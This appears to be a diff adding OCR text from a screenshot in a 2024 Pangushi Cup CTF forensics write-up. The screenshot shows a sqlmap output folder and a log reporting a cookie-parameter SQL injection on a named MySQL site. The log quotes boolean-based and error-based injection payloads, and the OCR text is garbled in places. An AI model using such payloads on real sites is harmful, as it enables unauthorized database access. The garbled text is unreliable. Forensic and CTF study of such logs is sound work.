@@ -1,0 +1,32 @@
+# OCR: 34bb27a8e2435f938af75cf2ac65c2c6.jpg
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/34bb27a8e2435f938af75cf2ac65c2c6.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:16
+
+>用户>Administrator>AppData>Local>sqlmap>output>gg.aigua666.com
+名称 dump log
+session.sqlite 目target.txt
+修改日期
+2024/2/2918:54 2024/2/2922:08 2024/2/2922:08 2024/2/2921:37
+NLocal/sqlmaploutputlgg.aigua666.com)log(SublimeText)-SublimeText 查看(V)转跳(G)工具(T)项目(P)设置(N)帮助(H)
+log
+类型文件夹文件
+SQLITE文件文本文档
+大小
+253KB 316KB 1KB
+sglmap identified the following injection point(s) with a total of 4o6 HTTP(s)requests:
+2
+Parameter：Cookie#1*（（custom）HEADER）
+4 5 6
+8 9 10
+11 12 13 14 15 16 17 18 19
+vpepoolean-baseg
+Title:MySQLRLIKEboolean-basedblind-WHERE,HAVING,ORDER BY or GROUP BY clause
+Payload:PHPSESSID=545u85oajk5pv21u720ge328eh:cusd="13777544812)RLIKE(SELECT（CASE
+END))--kYju";c_psd=494c059fb44681b441279f80595e31a2 Type:error-based
+Title:MySQL>=5.6ANDerror-basedWHERE,HAVING,ORDERBY or GROUP BY clause(GTIDS Payload:PHPSESSID-545u85oajk5pv21u720ge328eh;cusd="13777544812)ANDGTIDSUBSET（CONC 8776-87761)))，0x71706a7071)，8776)--yqHz";c_psd-494c059fb44681b441279f80595e31a2
+web application technology:Nginx back-endDBMS:MySQL>=5.6
+sqlmap resumed thefollowinginjection point(s)from stored session: Parameter:Cookie#1*（（custom）HEADER）
+Type:boolean-based blind
+Title:MySQL RLIKEboolean-basedblind-WHERE,HAVING,ORDER BY or GROUP BY clause
+Pay1oad:PHPSESSID=545u85oajk5pv21u720ge328eh;cusd="13777544812）RLIKE（SELECT（CASE END))--kYjU"：cpsd=494c059fb44681b441279f80595e31a2
